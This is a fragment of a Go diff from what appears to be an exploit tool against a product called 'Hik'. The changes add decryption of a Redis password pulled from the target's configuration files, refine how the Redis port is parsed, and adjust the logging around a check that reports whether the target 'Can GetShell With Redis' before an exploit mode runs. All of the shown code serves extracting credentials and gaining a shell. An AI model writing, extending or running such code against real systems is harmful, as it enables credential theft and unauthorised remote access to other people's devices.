@@ -140,9 +140,10 @@ func (h *Hik) extractRedisInfo() {
 	for _, v := range strings.Split(h.configProperties, "\n") {
 		if strings.Contains(v, "portalcache") && strings.Contains(v, "password") {
 			h.redisPasswordEncrypted = strings.SplitN(v, "=", 2)[1]
+			h.redisPasswordDecrypted, _ = DecryptData(h.redisPasswordEncrypted)
 			continue
 		}
-		if strings.Contains(v, "portalcache") && strings.Contains(v, ".port") {
+		if strings.Contains(v, "portalcache") && strings.Contains(v, ".port=") {
 			h.redisPort = strings.Split(v, "=")[1]
 			continue
 		}
@@ -165,6 +166,7 @@ func (h *Hik) Run() {
 	h.check()
 	if h.isVuln {
 		if h.canGetShell {
+			log.SetPrefix("[+] ")
 			log.Printf("Target %s Is Vuln And Can GetShell With Redis.\n", h.Target)
 			if h.Exploit {
 				log.SetPrefix("[!] ")
